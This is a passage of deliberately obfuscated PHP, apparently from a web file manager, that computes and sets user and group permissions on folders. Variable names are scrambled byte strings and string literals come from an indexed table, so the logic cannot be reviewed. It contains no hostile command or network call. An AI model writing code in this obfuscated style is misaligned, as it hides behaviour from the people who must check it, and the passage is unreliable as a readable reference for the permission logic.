$ÊÂ¢ÌÍö = array_unique($ÊÂ¢ÌÍö); $ŠöÎ®Œ” = array($è¿‡‡ëş[440] => _get($GLOBALS[$è¿‡‡ëş[7]], $è¿‡‡ëş[440], 1), $è¿‡‡ëş[451] => _get($GLOBALS[$è¿‡‡ëş[7]], $è¿‡‡ëş[451], 500)); $GLOBALS[$è¿‡‡ëş[7]][$è¿‡‡ëş[440]] = 1; $GLOBALS[$è¿‡‡ëş[7]][$è¿‡‡ëş[451]] = 500; $âÉó—Ş† = array($è¿‡‡ëş[514] => 0, $è¿‡‡ëş[2137] => AuthModel::authAll(), $è¿‡‡ëş[515] => LNG($è¿‡‡ëş[2316]), $è¿‡‡ëş[2152] => $è¿‡‡ëş[2317]); $âˆ©üŞ‚ = array(); $ÜÚß’ú = explode($è¿‡‡ëş[50], $è¿‡‡ëş[2318]); $÷ÛÂ™ì« = explode($è¿‡‡ëş[50], $è¿‡‡ëş[2319]); foreach ($ÊÂ¢ÌÍö as $¤´¦¾Ş¨) { $¦é ÃÜô = Model($è¿‡‡ëş[1442])->getInfo($¤´¦¾Ş¨); $¹ŞÒ¶ÙÊ = array_field_key($¦é ÃÜô, $ÜÚß’ú); $Ş”ÚÛ = Model($è¿‡‡ëş[623])->listByGroup($¤´¦¾Ş¨); foreach ($Ş”ÚÛ[$è¿‡‡ëş[457]] as $äˆşŞ§Ú => $…éŠÖ‹Ù) { $this->userGroupList($…éŠÖ‹Ù[$è¿‡‡ëş[1542]], $…éŠÖ‹Ù); $èùñúıû = $…éŠÖ‹Ù[$è¿‡‡ëş[1542]] . $è¿‡‡ëş[12]; if (isset($âˆ©üŞ‚[$èùñúıû])) { continue; } $ÈÍŞ–ßú = Model($è¿‡‡ëş[2320])->listData($…éŠÖ‹Ù[$è¿‡‡ëş[2321]]); $…éŠÖ‹Ù[$è¿‡‡ëş[2322]] = Action($è¿‡‡ëş[2323])->parseUrl($…éŠÖ‹Ù[$è¿‡‡ëş[2322]]); $…éŠÖ‹Ù[$è¿‡‡ëş[1890]] = $ÈÍŞ–ßú && $ÈÍŞ–ßú[$è¿‡‡ëş[2324]] == 1; $ÒÄ±ÉÈ = $this->groupRootAuth($¤´¦¾Ş¨, $…éŠÖ‹Ù[$è¿‡‡ëş[1542]]); $ÒÄ±ÉÈ = $…éŠÖ‹Ù[$è¿‡‡ëş[1890]] ? $âÉó—Ş† : $ÒÄ±ÉÈ; $âˆ©üŞ‚[$èùñúıû] = array($è¿‡‡ëş[2325] => $è¿‡‡ëş[2326], $è¿‡‡ëş[2327] => LNG($è¿‡‡ëş[2328]), $è¿‡‡ëş[2305] => array_field_key($…éŠÖ‹Ù, $÷ÛÂ™ì«), $è¿‡‡ëş[508] => $ÒÄ±ÉÈ, $è¿‡‡ëş[509] => $ÒÄ±ÉÈ[$è¿‡‡ëş[508]], $è¿‡‡ëş[2329] => $¹ŞÒ¶ÙÊ); } } $GLOBALS[$è¿‡‡ëş[7]][$è¿‡‡ëş[440]] = $ŠöÎ®Œ”[$è¿‡‡ëş[440]]; $GLOBALS[$è¿‡‡ëş[7]][$è¿‡‡ëş[451]] = $ŠöÎ®Œ”[$è¿‡‡ëş[451]]; foreach ($ÚÁ¾§œ as $Ş§Õ—úÑ => $çª ‡Ğ) { if (!$çª ‡Ğ) { continue; } foreach ($çª ‡Ğ as $±´·ò¥) { if (!$±´·ò¥ || !$±´·ò¥[$è¿‡‡ëş[595]] || $±´·ò¥[$è¿‡‡ëş[595]] == $è¿‡‡ëş[241]) { continue; } if ($±´·ò¥[$è¿‡‡ëş[201]] != SourceModel::TYPE_USER) { continue; } $èùñúıû = $±´·ò¥[$è¿‡‡ëş[595]] . $è¿‡‡ëş[12]; if (isset($âˆ©üŞ‚[$èùñúıû])) { continue; } $­ÉäË²× = $this->authMake($çª ‡Ğ, $èùñúıû); if (!$­ÉäË²× || !$­ÉäË²×[$è¿‡‡ëş[2327]]) { continue; } $âˆ©üŞ‚[$èùñúıû] = array($è¿‡‡ëş[2325] => $è¿‡‡ëş[2330], $è¿‡‡ëş[2327] => $­ÉäË²×[$è¿‡‡ëş[2327]], $è¿‡‡ëş[2305] => Model($è¿‡‡ëş[623])->getInfoSimpleOuter($èùñúıû), $è¿‡‡ëş[508] => $­ÉäË²×[$è¿‡‡ëş[562]], $è¿‡‡ëş[509] => $­ÉäË²×[$è¿‡‡ëş[562]][$è¿‡‡ëş[508]], $è¿‡‡ëş[2329] => $­ÉäË²×[$è¿‡‡ëş[2331]]); } } foreach ($ÚÁ¾§œ as $Ş§Õ—úÑ => $çª ‡Ğ) { if (!$çª ‡Ğ) { continue; } foreach ($âˆ©üŞ‚ as $èùñúıû => $“§şŒ¤¥) { if ($“§şŒ¤¥[$è¿‡‡ëş[2305]][$è¿‡‡ëş[1890]] || $“§şŒ¤¥[$è¿‡‡ëş[2325]] == $è¿‡‡ëş[2330]) { continue; } $­ÉäË²× = $this->authMake($çª ‡Ğ, $èùñúıû); if (!$­ÉäË²× || !$­ÉäË²×[$è¿‡‡ëş[2327]]) { continue; } $âˆ©üŞ‚[$èùñúıû] = array($è¿‡‡ëş[2325] => $è¿‡‡ëş[2330], $è¿‡‡ëş[2327] => $­ÉäË²×[$è¿‡‡ëş[2327]], $è¿‡‡ëş[2305] => $“§şŒ¤¥[$è¿‡‡ëş[2305]], $è¿‡‡ëş[508] => $­ÉäË²×[$è¿‡‡ëş[562]], $è¿‡‡ëş[509] => $­ÉäË²×[$è¿‡‡ëş[562]][$è¿‡‡ëş[508]], $è¿‡‡ëş[2329] => $­ÉäË²×[$è¿‡‡ëş[2331]]); } } $âˆ©üŞ‚ = array_sort_by($âˆ©üŞ‚, $è¿‡‡ëş[509], $è¿‡‡ëş[546]); return $âˆ©üŞ‚; } public function getAllChildren($ÖÏíÛ”æ) { $Ä©»ÊÒ› =& $_SERVER[¤øïŠ‹²]; $ğ›€Ë€å = Model($Ä©»ÊÒ›[1482])->sourceInfo($ÖÏíÛ”æ); if ($ğ›€Ë€å[$Ä©»ÊÒ›[506]] != $Ä©»ÊÒ›[102]) { return $this->sourceListAuth(array($ÖÏíÛ”æ)); } if ($ğ›€Ë€å[$Ä©»ÊÒ›[201]] != SourceModel::TYPE_GROUP) { return array(); } $êòš¢· = 1; $ã¿å¢³† = array($ÖÏíÛ”æ); if ($ğ›€Ë€å[$Ä©»ÊÒ›[203]] == $Ä©»ÊÒ›[241] && $ğ›€Ë€å[$Ä©»ÊÒ›[595]] != $êòš¢·) { $ã¿å¢³† = $this->groupChidldAllRootSource($ğ›€Ë€å[$Ä©»ÊÒ›[595]]); } $ÕõäÒ° = $this->field($Ä©»ÊÒ›[204])->group($Ä©»ÊÒ›[204])->select(); $ÕõäÒ° = array_to_keyvalue($ÕõäÒ°, $Ä©»ÊÒ›[12], $Ä©»ÊÒ›[204]); if (!$ÕõäÒ°) { return array(); } $Ó¼‹Ë = $Ä©»ÊÒ›[2332]; $Ùé§á“ = array($Ä©»ÊÒ›[204] => array($Ä©»ÊÒ›[7], $ÕõäÒ°), $Ä©»ÊÒ›[526] => $Ä©»ÊÒ›[241]); $§ë¢÷’• = Model($Ä©»ÊÒ›[934])->field($Ó¼‹Ë)->where($Ùé§á“)->select(); $«µ§˜šÙ = array($ÖÏíÛ”æ); foreach ($§ë¢÷’• as $¬˜Û„µ) { foreach ($ã¿å¢³† as $…ÒÌ¯«) { $èØ‹ÍÉ“ = $Ä©»ÊÒ›[50] . $…ÒÌ¯« . $Ä©»ÊÒ›[50]; $¼æÉ¯é = $¬˜Û„µ[$Ä©»ÊÒ›[610]] . $¬˜Û„µ[$Ä©»ÊÒ›[204]] . $Ä©»ÊÒ›[50]; if (strstr($¼æÉ¯é, $èØ‹ÍÉ“)) { $«µ§˜šÙ[] = $¬˜Û„µ[$Ä©»ÊÒ›[204]]; break; } } } return $this->sourceListAuth($«µ§˜šÙ); } private function sourceListAuth($óë˜Çì) { $ÎÆé€å =& $_SERVER[¤øïŠ‹²]; $³ˆÂÕŸä = Model($ÎÆé€å[1482])->sourceListInfo($óë˜Çì, !0); $—â¤´Ëµ = $this->sourceAuthSelect($óë˜Çì); $•¢€”Ï = array(); $¶Ã„²í = array(); foreach ($³ˆÂÕŸä as $Ì»ƒËßÒ) { unset($Ì»ƒËßÒ[$ÎÆé€å[549]]); unset($Ì»ƒËßÒ[$ÎÆé€å[547]]); unset($Ì»ƒËßÒ[$ÎÆé€å[508]]); unset($Ì»ƒËßÒ[$ÎÆé€å[101]]); $üØŒØ¹ = $—â¤´Ëµ[$Ì»ƒËßÒ[$ÎÆé€å[204]]]; if (!$üØŒØ¹) { continue; } $Ì»ƒËßÒ[$ÎÆé€å[2329]] = $this->authTargetInfo($üØŒØ¹); $Ì»ƒËßÒ[$ÎÆé€å[608]] = rtrim($Ì»ƒËßÒ[$ÎÆé€å[614]], $ÎÆé€å[8]) . $ÎÆé€å[8] . ltrim($Ì»ƒËßÒ[$ÎÆé€å[608]], $ÎÆé€å[8]); $•¢€”Ï[] = $Ì»ƒËßÒ; $ŸÕ°ä¿© = count(explode($ÎÆé€å[8], trim($Ì»ƒËßÒ[$ÎÆé€å[608]], $ÎÆé€å[8]))); $¶Ã„²í[] = $ŸÕ°ä¿© + ($Ì»ƒËßÒ[$ÎÆé€å[33]] == $ÎÆé€å[89] ? 0 : 1000); } array_multisort($¶Ã„²í, SORT_ASC, $•¢€”Ï); return $•¢€”Ï; } private function groupChidldAllRootSource($Æ¿ÆÒßß) { $¢¬øœÁë =& $_SERVER[¤øïŠ‹²]; $á‰ªÌ¢… = Model($¢¬øœÁë[1442])->groupChildrenAll($Æ¿ÆÒßß); $ì¦ø¬„ = array($¢¬øœÁë[203] => 0, $¢¬øœÁë[595] => array($¢¬øœÁë[7], $á‰ªÌ¢…), $¢¬øœÁë[201] => SourceModel::TYPE_GROUP); $îÉ½Æõ = Model($¢¬øœÁë[934])->field($¢¬øœÁë[204])->where($ì¦ø¬„)->select(); $îÉ½Æõ = array_to_keyvalue($îÉ½Æõ, $¢¬øœÁë[12], $¢¬øœÁë[204]); return $îÉ½Æõ; } private function authTargetInfo($²îóï±) { $ûŸÀØ€‡ =& $_SERVER[¤øïŠ‹²]; $³–×İŸ½ = array(); $‡²óàú“ = array(); $ÚÄ±ñ®´ = 2 << 25; foreach ($²îóï± as $Ìş¯¶œ°) { $§›ª£½™ = Model($ûŸÀØ€‡[597])->listData($Ìş¯¶œ°[$ûŸÀØ€‡[1589]]); if (!$§›ª£½™) { continue; } if ($Ìş¯¶œ°[$ûŸÀØ€‡[201]] == SourceModel::TYPE_USER) { $©—¦Ô©ğ = Model($ûŸÀØ€‡[603])->getInfoSimpleOuter($Ìş¯¶œ°[$ûŸÀØ€‡[595]]); if ($©—¦Ô©ğ[$ûŸÀØ€‡[1542]] == $ûŸÀØ€‡[1326]) { continue; } if ($©—¦Ô©ğ[$ûŸÀØ€‡[1542]] == $ûŸÀØ€‡[241]) { $©—¦Ô©ğ[$ûŸÀØ€‡[32]] = LNG($ûŸÀØ€‡[2333]); } } else { $©—¦Ô©ğ = Model($ûŸÀØ€‡[611])->getInfoSimple($Ìş¯¶œ°[$ûŸÀØ€‡[595]]); } if (!$©—¦Ô©ğ) { continue; } $©—¦Ô©ğ[$ûŸÀØ€‡[562]] = $§›ª£½™; $³–×İŸ½[] = $©—¦Ô©ğ; $‹Â÷†­ = 0; if ($Ìş¯¶œ°[$ûŸÀØ€‡[201]] == SourceModel::TYPE_GROUP) { $‹Â÷†­ = $ÚÄ±ñ®´ * 2; } if ($Ìş¯¶œ°[$ûŸÀØ€‡[201]] == SourceModel::TYPE_USER) { $‹Â÷†­ = $ÚÄ±ñ®´; } if ($Ìş¯¶œ°[$ûŸÀØ€‡[201]] == SourceModel::TYPE_USER && $Ìş¯¶œ°[$ûŸÀØ€‡[595]] == $ûŸÀØ€‡[241]) { $‹Â÷†­ = 0; } $‡²óàú“[] = $§›ª£½™[$ûŸÀØ€‡[508]] + $‹Â÷†­; } array_multisort($‡²óàú“, SORT_DESC, $³–×İŸ½); return $³–×İŸ½; } public function getAllChildrenByUser($˜¤¥şçà, $©­‚Úµ·) { $–ğ•‚¶‚ =& $_SERVER[¤øïŠ‹²]; $„³Èì = Model($–ğ•‚¶‚[623])->getInfo($©­‚Úµ·); if (!$©­‚Úµ· || !$˜¤¥şçà || !$„³Èì) { return array(); } $½İ©Ï¾‹ = Model($–ğ•‚¶‚[1482])->sourceInfo($˜¤¥şçà); $ƒ¢»çäÜ = array(); $œµ¸»¾ = 1; if ($½İ©Ï¾‹[$–ğ•‚¶‚[203]] == $–ğ•‚¶‚[241] && $½İ©Ï¾‹[$–ğ•‚¶‚[595]] != $œµ¸»¾ && $this->groupContainUser($½İ©Ï¾‹[$–ğ•‚¶‚[595]], $©­‚Úµ·)) { foreach ($„³Èì[$–ğ•‚¶‚[1443]] as $üõ§íù) { $€«¾ááÌ = Model($–ğ•‚¶‚[611])->getInfo($üõ§íù[$–ğ•‚¶‚[1444]]); $œ¼Ù½¶à = Model($–ğ•‚¶‚[623])->getInfoSimpleOuter($©­‚Úµ·); $œ¼Ù½¶à[$–ğ•‚¶‚[562]] = $üõ§íù[$–ğ•‚¶‚[508]]; if (Model($–ğ•‚¶‚[597])->authCheckAction($üõ§íù[$–ğ•‚¶‚[508]][$–ğ•‚¶‚[508]], $–ğ•‚¶‚[1514])) { continue; } $àãó»ë´ = array($–ğ•‚¶‚[32] => $–ğ•‚¶‚[1345] . $€«¾ááÌ[$–ğ•‚¶‚[32]], $–ğ•‚¶‚[204] => $€«¾ááÌ[$–ğ•‚¶‚[101]][$–ğ•‚¶‚[204]], $–ğ•‚¶‚[98] => KodIO::make($€«¾ááÌ[$–ğ•‚¶‚[101]][$–ğ•‚¶‚[204]]), $–ğ•‚¶‚[203] => $–ğ•‚¶‚[241], $–ğ•‚¶‚[201] => $–ğ•‚¶‚[604], $–ğ•‚¶‚[33] => $–ğ•‚¶‚[645], $–ğ•‚¶‚[608] => $€«¾ááÌ[$–ğ•‚¶‚[615]], $–ğ•‚¶‚[1444] => $€«¾ááÌ[$–ğ•‚¶‚[1444]], $–ğ•‚¶‚[612] => $€«¾ááÌ[$–ğ•‚¶‚[203]], $–ğ•‚¶‚[2329] => array($œ¼Ù½¶à)); $ƒ¢»çäÜ[$àãó»ë´[$–ğ•‚¶‚[204]]] = $àãó»ë´; } } $ŒÁ‘Î§Â = array(); $Ãä­‚ìÑ = $this->getAllChildren($˜¤¥şçà); foreach ($Ãä­‚ìÑ as $òŠ¿ÉÓ) { $¥ÖŸË›İ = !1; foreach ($òŠ¿ÉÓ[$–ğ•‚¶‚[2329]] as $½„éøè) { if ($½„éøè[$–ğ•‚¶‚[1542]]) { if ($½„éøè[$–ğ•‚¶‚[1542]] == $©­‚Úµ·) { $¥ÖŸË›İ = !0; break; } } if ($½„éøè[$–ğ•‚¶‚[1444]]) { if ($this->groupContainUser($½„éøè[$–ğ•‚¶‚[1444]], $©­‚Úµ·)) { $¥ÖŸË›İ = !0; break; } } } if ($¥ÖŸË›İ) { $ŒÁ‘Î§Â[] = $òŠ¿ÉÓ; } $ŞÈô¼ñ‰ = $òŠ¿ÉÓ[$–ğ•‚¶‚[204]]; if (isset($ƒ¢»çäÜ[$ŞÈô¼ñ‰])) { $òŠ¿ÉÓ[$–ğ•‚¶‚[2329]][] = $ƒ¢»çäÜ[$ŞÈô¼ñ‰][0]; $ƒ¢»çäÜ[$ŞÈô¼ñ‰] = !1; } } $ƒ¢»çäÜ = array_filter(array_values($ƒ¢»çäÜ)); $ŒÁ‘Î§Â = array_merge($ƒ¢»çäÜ, $ŒÁ‘Î§Â); return $ŒÁ‘Î§Â; } public function setAllChildrenByUser($ğ¦Ö£÷Ò, $æ€™‚æ, $ãÖÁ°‚÷) { $›£ÈÄ¤÷ =& $_SERVER[¤øïŠ‹²]; $Íı”×î = $this->getAllChildrenByUser($ğ¦Ö£÷Ò, $æ€™‚æ); if (!$ãÖÁ°‚÷ || !$Íı”×î) { return !1; } foreach ($Íı”×î as $½ë×ŸÅ°) { $êùı¢’ = array(); foreach ($½ë×ŸÅ°[$›£ÈÄ¤÷[2329]] as $¢ØœËı) { $Ò¿˜ú”â = $¢ØœËı[$›£ÈÄ¤÷[562]]; $ïÕ¢„’á = $¢ØœËı[$›£ÈÄ¤÷[1542]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $É÷†øáÚ = $¢ØœËı[$›£ÈÄ¤÷[1542]] ? $¢ØœËı[$›£ÈÄ¤÷[1542]] : $¢ØœËı[$›£ÈÄ¤÷[1444]]; if ($¢ØœËı[$›£ÈÄ¤÷[1542]] && $¢ØœËı[$›£ÈÄ¤÷[1542]] == $æ€™‚æ) { continue; } $êùı¢’[] = array($›£ÈÄ¤÷[204] => $½ë×ŸÅ°[$›£ÈÄ¤÷[204]], $›£ÈÄ¤÷[201] => $ïÕ¢„’á, $›£ÈÄ¤÷[595] => intval($É÷†øáÚ), $›£ÈÄ¤÷[1589] => isset($Ò¿˜ú”â[$›£ÈÄ¤÷[493]]) ? intval($Ò¿˜ú”â[$›£ÈÄ¤÷[493]]) : 0, $›£ÈÄ¤÷[2293] => isset($Ò¿˜ú”â[$›£ÈÄ¤÷[2293]]) ? intval($Ò¿˜ú”â[$›£ÈÄ¤÷[2293]]) : -1); } $êùı¢’[] = array($›£ÈÄ¤÷[204] => $½ë×ŸÅ°[$›£ÈÄ¤÷[204]], $›£ÈÄ¤÷[201] => SourceModel::TYPE_USER, $›£ÈÄ¤÷[595] => intval($æ€™‚æ), $›£ÈÄ¤÷[1589] => intval($ãÖÁ°‚÷), $›£ÈÄ¤÷[2293] => -1); $this->where(array($›£ÈÄ¤÷[512] => $½ë×ŸÅ°[$›£ÈÄ¤÷[204]]))->delete(); $this->addAll($êùı¢’); } return !0; } public function get($¨¨©»”) { $Œ’ Šñ— = $this->getSourceList(array($¨¨©»”), !0); return $Œ’ Šñ—[0]; } public function getSourceList($±Ö„óÄ, $õ‚Ï³ = false, $ÃÏ¬ê¯ = false) { $ÖÏƒÚ»Î =& $_SERVER[¤øïŠ‹²]; if (!$±Ö„óÄ) { return array(); } $Î½Ù¾áŸ = Model($ÖÏƒÚ»Î[1482]); if (!$õ‚Ï³ && count($±Ö„óÄ) == 1) { $õ‚Ï³ = array(); $õ‚Ï³[$±Ö„óÄ[0]] = $Î½Ù¾áŸ->sourceInfo($±Ö„óÄ[0]); } if (!$õ‚Ï³) { $ÑºûÒ‚ˆ = array($ÖÏƒÚ»Î[512] => array($ÖÏƒÚ»Î[513], $±Ö„óÄ)); $õ‚Ï³ = $Î½Ù¾áŸ->field($ÖÏƒÚ»Î[2334])->where($ÑºûÒ‚ˆ)->select(); $õ‚Ï³ = array_to_keyvalue($õ‚Ï³, $ÖÏƒÚ»Î[204]); } $±œ¸ß©‚ = $±Ö„óÄ; foreach ($õ‚Ï³ as $—ö Îƒ  => $÷£Ş’³‚) { $´ÉêäÍ± = $Î½Ù¾áŸ->parentLevelArray($÷£Ş’³‚[$ÖÏƒÚ»Î[610]]); $±œ¸ß©‚ = array_merge($±œ¸ß©‚, array(intval($—ö Îƒ )), array_reverse($´ÉêäÍ±)); } $±œ¸ß©‚ = array_values(array_unique($±œ¸ß©‚)); if (!$±œ¸ß©‚) { return array(); } $€Ğ•ÇÂ„ = $this->sourceAuthSelect($±œ¸ß©‚); $²„ï¸à£ = array(); foreach ($±œ¸ß©‚ as $×òçºÙÔ) { if (isset($€Ğ•ÇÂ„[$×òçºÙÔ])) { $²„ï¸à£[$×òçºÙÔ] = $€Ğ•ÇÂ„[$×òçºÙÔ]; } } $ŠÕÜ‘ªÂ = $this->userIsRoot($ÃÏ¬ê¯); $ä¬ºÒ®è = AuthModel::authAll(); $ÏÁçßÕ = array($ÖÏƒÚ»Î[509] => $ä¬ºÒ®è, $ÖÏƒÚ»Î[2335] => array($ÖÏƒÚ»Î[514] => 0, $ÖÏƒÚ»Î[2137] => $ä¬ºÒ®è, $ÖÏƒÚ»Î[515] => LNG($ÖÏƒÚ»Î[2316]), $ÖÏƒÚ»Î[2152] => $ÖÏƒÚ»Î[2317])); $ÕšÒÁ÷ë = array(); foreach ($õ‚Ï³ as $×òçºÙÔ => $×å¬¬Ç¶) { if ($ŠÕÜ‘ªÂ && $GLOBALS[$ÖÏƒÚ»Î[6]][$ÖÏƒÚ»Î[2150]]) { $ÕšÒÁ÷ë[$×òçºÙÔ] = $ÏÁçßÕ; continue; } $ÕšÒÁ÷ë[$×òçºÙÔ] = $this->makeSourceAuth($×å¬¬Ç¶, $²„ï¸à£, $ÃÏ¬ê¯); } return $ÕšÒÁ÷ë; } public function authDeepCheck($ü¿Â¥­…, $´‡ä«í = false) { $üóˆïƒ =& $_SERVER[¤øïŠ‹²]; $´‡ä«í = $´‡ä«í ? $´‡ä«í : USER_ID; $Ñİ¦ıù = $this->makeAuthDeep($´‡ä«í); if (!in_array($ü¿Â¥­…, $Ñİ¦ıù[$üóˆïƒ[2336]])) { return !1; } $’¨¦Àî = array(); foreach ($Ñİ¦ıù[$üóˆïƒ[2337]] as $™ÇÓÜ¦’ => $â·ê¸å–) { if (!in_array($ü¿Â¥­…, $â·ê¸å–)) { continue; } $’¨¦Àî[] = $™ÇÓÜ¦’; } if (!$’¨¦Àî) { return !1; } $¸À§ÀÚƒ = $’¨¦Àî ? $’¨¦Àî[0] : $ü¿Â¥­…; return array($üóˆïƒ[509] => -1, $üóˆïƒ[562] => array($üóˆïƒ[514] => $üóˆïƒ[1326], $üóˆïƒ[2137] => $üóˆïƒ[241], $üóˆïƒ[515] => LNG($üóˆïƒ[2338]), $üóˆïƒ[2152] => $üóˆïƒ[2339]), $üóˆïƒ[2327] => LNG($üóˆïƒ[2340]), $üóˆïƒ[2341] => $this->sourceAuthInfo($¸À§ÀÚƒ)); } protected function makeAuthDeep($Á‰áàœÖ = false) { $ëÜ— ° =& $_SERVER[¤øïŠ‹²]; static $‘ÉŸı¿ = array(); $Á‰áàœÖ = $Á‰áàœÖ ? $Á‰áàœÖ : USER_ID; if (isset($‘ÉŸı¿[$Á‰áàœÖ])) { return $‘ÉŸı¿[$Á‰áàœÖ]; } $í„Ç»×‘ = Model($ëÜ— °[2342])->listData(); $ãï÷˜¬‹ = array(); foreach ($í„Ç»×‘ as $¤ÓÃ®…Ï) { if ($¤ÓÃ®…Ï[$ëÜ— °[508]] == 0 && $¤ÓÃ®…Ï[$ëÜ— °[2151]] == $ëÜ— °[102]) { $ãï÷˜¬‹[] = $¤ÓÃ®…Ï[$ëÜ— °[493]]; } } $¸¯°¦  = $this->userGroupParents($Á‰áàœÖ); $è–‡ğİÖ = array($ëÜ— °[201] => SourceModel::TYPE_USER, $ëÜ— °[595] => $Á‰áàœÖ); if ($¸¯°¦ ) { $è–‡ğİÖ = array(array($ëÜ— °[201] => SourceModel::TYPE_USER, $ëÜ— °[595] => $Á‰áàœÖ), array($ëÜ— °[201] => SourceModel::TYPE_GROUP, $ëÜ— °[595] => array($ëÜ— °[513], $¸¯°¦ )), $ëÜ— °[1116] => $ëÜ— °[2231]); } $³¾æöğø = $this->field($ëÜ— °[2343])->where($è–‡ğİÖ)->select(); $é†ãéË = array(); $˜ôÌ†«¾ = array_to_keyvalue_group($³¾æöğø, $ëÜ— °[204]); foreach ($˜ôÌ†«¾ as $Ğ…¾»ç => $º™‡¨¾) { $âöú×úÔ = $this->authArrayCheck($º™‡¨¾, $Á‰áàœÖ); if ($âöú×úÔ[$ëÜ— °[509]] > 0) { $é†ãéË[] = $Ğ…¾»ç . $ëÜ— °[12]; } } if ($¸¯°¦ ) { $¤«ªõ°Ü = Model($ëÜ— °[611]); foreach ($¸¯°¦  as $òÓ…›Øœ) { $ÎÏİş³ = $¤«ªõ°Ü->getInfo($òÓ…›Øœ); if (!$ÎÏİş³ || !is_array($ÎÏİş³[$ëÜ— °[101]])) { continue; } $é†ãéË[] = $ÎÏİş³[$ëÜ— °[101]][$ëÜ— °[204]]; } } $œæ’§¾ = array(); $Ö©ªÌ¡í = $¸¯°¦ ; $ÙÆëŠà = Model($ëÜ— °[1482]); $¤«ªõ°Ü = Model($ëÜ— °[611]); $åúæ×´ü = array(); $‡ºÚş¡¢ = array(); $ƒŒşÛÑØ = array(); $µçÎıŒå = array(); if ($é†ãéË) { $£˜Àçû = $ÙÆëŠà->where(array($ëÜ— °[204] => array($ëÜ— °[513], $é†ãéË)))->select(); foreach ($£˜Àçû as $Î¤¨Â¨ø) { if ($Î¤¨Â¨ø[$ëÜ— °[526]] == $ëÜ— °[102]) { continue; } $ö«¶Ûƒ = $ÙÆëŠà->parentLevelArray($Î¤¨Â¨ø[$ëÜ— °[610]]); $œæ’§¾ = array_merge($œæ’§¾, $ö«¶Ûƒ); $Ö©ªÌ¡í[] = $Î¤¨Â¨ø[$ëÜ— °[595]]; $åúæ×´ü[$Î¤¨Â¨ø[$ëÜ— °[204]]] = $ö«¶Ûƒ; $‡ºÚş¡¢[$Î¤¨Â¨ø[$ëÜ— °[204]]] = $Î¤¨Â¨ø[$ëÜ— °[595]]; } } $Ö©ªÌ¡í = array_values(array_unique($Ö©ªÌ¡í)); $Ç½şüéò = $Ö©ªÌ¡í; foreach ($Ç½şüéò as $òÓ…›Øœ) { $ÎÏİş³ = $¤«ªõ°Ü->getInfo($òÓ…›Øœ); $ö«¶Ûƒ = $ÙÆëŠà->parentLevelArray($ÎÏİş³[$ëÜ— °[610]]); $Ö©ªÌ¡í = array_merge($Ö©ªÌ¡í, $ö«¶Ûƒ); } $Ö©ªÌ¡í = array_values(array_unique($Ö©ªÌ¡í)); foreach ($Ö©ªÌ¡í as $òÓ…›Øœ) { $ÎÏİş³ = $¤«ªõ°Ü->getInfo($òÓ…›Øœ); $œæ’§¾[] = $ÎÏİş³[$ëÜ— °[101]][$ëÜ— °[204]]; $ƒŒşÛÑØ[$òÓ…›Øœ] = $ÎÏİş³[$ëÜ— °[101]][$ëÜ— °[204]]; $µçÎıŒå[$òÓ…›Øœ] = $ÙÆëŠà->parentLevelArray($ÎÏİş³[$ëÜ— °[610]]); } foreach ($åúæ×´ü as $ì•²¸øò => $ ÎÅºìĞ) { $‡ùîÜ´Ì = $‡ºÚş¡¢[$ì•²¸øò]; if (!$‡ùîÜ´Ì || !$ƒŒşÛÑØ[$‡ùîÜ´Ì]) { continue; } $ı¯ŒŠÈ = array(); foreach ($µçÎıŒå[$‡ùîÜ´Ì] as $òÓ…›Øœ) { $ı¯ŒŠÈ[] = $ƒŒşÛÑØ[$òÓ…›Øœ]; } $åúæ×´ü[$ì•²¸øò] = array_merge($ı¯ŒŠÈ, $ ÎÅºìĞ); } $œæ’§¾ = array_values(array_unique($œæ’§¾)); $ŞŞ•¯×® = array($ëÜ— °[2336] => $œæ’§¾, $ëÜ— °[2337] => $åúæ×´ü); $‘ÉŸı¿[$Á‰áàœÖ] = $ŞŞ•¯×®; return $ŞŞ•¯×®; } private function makeSourceAuth($œ«öæïÁ, $¾¶Õ¶±‚, $íÕ©™£ = false) { $áº”µÈÓ =& $_SERVER[¤øïŠ‹²]; $Ô¾Ò©œ´ = $áº”µÈÓ[102]; $áç€ã²¶ = $œ«öæïÁ[$áº”µÈÓ[595]]; $ıç ÉÏ = $œ«öæïÁ[$áº”µÈÓ[201]] == SourceModel::TYPE_GROUP; $–™›±¤† = $ıç ÉÏ ? $this->groupRootAuth($áç€ã²¶, $íÕ©™£) : !1; if ($–™›±¤† && Model($áº”µÈÓ[597])->authCheckAction($–™›±¤†[$áº”µÈÓ[508]], $áº”µÈÓ[1514])) { return $this->groupAuthInfo($–™›±¤†, $áç€ã²¶); } $®Â—î™• = Model($áº”µÈÓ[1482])->parentLevelArray($œ«öæïÁ[$áº”µÈÓ[610]]); $®Â—î™• = array_merge(array($œ«öæïÁ[$áº”µÈÓ[204]]), array_reverse($®Â—î™•)); $Ì¡œí¹ = !1; foreach ($®Â—î™• as $ ¢Ôûï) { if (!isset($¾¶Õ¶±‚[$ ¢Ôûï])) { continue; } $ÃåÅ‡«İ = $this->authMake($¾¶Õ¶±‚[$ ¢Ôûï], $íÕ©™£); if ($ÃåÅ‡«İ[$áº”µÈÓ[562]]) { $Ì¡œí¹ = $ÃåÅ‡«İ; break; } } if (!$ıç ÉÏ) { return $Ì¡œí¹; } if (!$Ì¡œí¹ && $–™›±¤†) { $Ì¡œí¹ = $this->groupAuthInfo($–™›±¤†, $áç€ã²¶); } if (!$Ì¡œí¹) { $»³³²×Ñ = Model($áº”µÈÓ[611])->getInfo($áç€ã²¶); $¸õòÀÔŸ = explode($áº”µÈÓ[50], trim($»³³²×Ñ[$áº”µÈÓ[610]], $áº”µÈÓ[50])); $¸õòÀÔŸ = array_reverse($¸õòÀÔŸ); foreach ($¸õòÀÔŸ as $õ¶áàóÔ) { if ($õ¶áàóÔ == $áº”µÈÓ[241] || $õ¶áàóÔ == $Ô¾Ò©œ´) { continue; } $×²œ¹®– = $this->groupRootAuth($õ¶áàóÔ, $íÕ©™£); if (!$×²œ¹®–) { continue; } $Ì¡œí¹ = $this->groupAuthInfo($×²œ¹®–, $õ¶áàóÔ); break; } } if (!$Ì¡œí¹ || $Ì¡œí¹[$áº”µÈÓ[509]] <= 0) { $öèÅƒ’£ = $this->authDeepCheck($œ«öæïÁ[$áº”µÈÓ[204]], $íÕ©™£); if ($öèÅƒ’£) { $Ì¡œí¹ = $öèÅƒ’£; } } return $Ì¡œí¹; } private function userIsRoot($õèèÙ‘„ = false) { $úªşÌğµ =& $_SERVER[¤øïŠ‹²]; if (!$õèèÙ‘„ && KodUser::isRoot()) { return !0; } $¨ŞõÔßˆ = 